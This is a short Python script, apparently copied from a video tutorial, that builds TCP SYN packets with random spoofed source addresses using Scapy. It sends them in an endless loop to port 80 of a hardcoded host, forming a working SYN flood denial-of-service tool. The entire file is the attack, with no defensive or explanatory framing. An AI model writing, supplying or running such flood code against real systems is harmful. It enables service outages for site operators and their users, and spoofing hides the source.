# Ref : https://www.youtube.com/watch?v=AHkBTGb4Pkg

# TCP SYN Flood Attack using Scapy

from scapy.all import *

def tcp_syn(ip_addr, sport, dport):
    s_addr = RandIP()
    d_addr = ip_addr

    packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=dport, seq=150566, flags="S")
    send(packet)

while(True):
    tcp_syn("192.168.31.51",1234,80)

